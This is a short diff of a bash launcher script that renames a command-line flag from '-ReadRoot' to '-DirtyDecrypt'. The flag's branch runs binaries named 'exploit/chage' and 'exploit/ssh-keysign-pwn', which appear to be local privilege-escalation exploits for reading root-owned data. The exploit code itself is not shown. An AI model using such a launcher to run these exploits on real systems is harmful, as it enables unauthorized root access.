@@ -149,7 +149,7 @@ if [[ "$*" == "-Fragnesia" ]]; then
 fi
 
 # ReadRoot
-if [[ "$*" == "-ReadRoot" ]]; then
+if [[ "$*" == "-DirtyDecrypt" ]]; then
      ${PWD}/exploit/chage
      echo "-------------------------"
      ${PWD}/exploit/ssh-keysign-pwn
